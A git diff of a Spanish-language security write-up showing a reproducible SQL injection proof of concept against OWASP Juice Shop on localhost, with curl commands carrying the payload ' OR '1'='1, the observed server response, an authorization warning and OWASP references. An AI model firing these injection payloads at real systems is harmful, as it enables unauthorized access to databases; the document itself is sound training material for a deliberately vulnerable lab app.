@@ -19,20 +19,29 @@ Mostrar una prueba de concepto (PoC) reproducible que evidencie cómo una entrad
 ## PoC (comando reproducible)
 > Ejecutar **solo** en un entorno de pruebas local donde tengas permiso (por ejemplo Juice Shop levantado en Docker en `http://localhost:3000`).
 
-```
 # forma directa (URL codificada)
+
+```
 curl -s "http://localhost:3000/rest/products/search?q=%27%20OR%20%271%27%3D%271" | jq .
+```
 
 # alternativa equivalente (dejar que curl codifique)
+
+```
+
 curl -s --get --data-urlencode "q=' OR '1'='1" "http://localhost:3000/rest/products/search" | jq .
+```
 
 ## Payload usado (legible)
+
 ```
 ' OR '1'='1
+
 ```
 ## Resultado observado
 
 ##### La respuesta del servidor fue del tipo:
+
 ```
 {"status":"success","data":[ ... ]}
 
@@ -86,3 +95,11 @@ Estas pruebas se ejecutaron en un entorno local y controlado (Juice Shop en Dock
 No realices pruebas de este tipo contra sistemas que no sean de tu propiedad o donde no tengas autorización.
 
 Si necesitas intercambio de artefactos originales para auditoría, compártelos privadamente y siempre tras sanitizarlos.
+
+## Referencias / Recursos
+
+OWASP Juice Shop — https://owasp.org/www-project-juice-shop/
+
+OWASP Testing Guide — SQL Injection testing
+
+OWASP ZAP — herramienta DAST útil para integración en CI
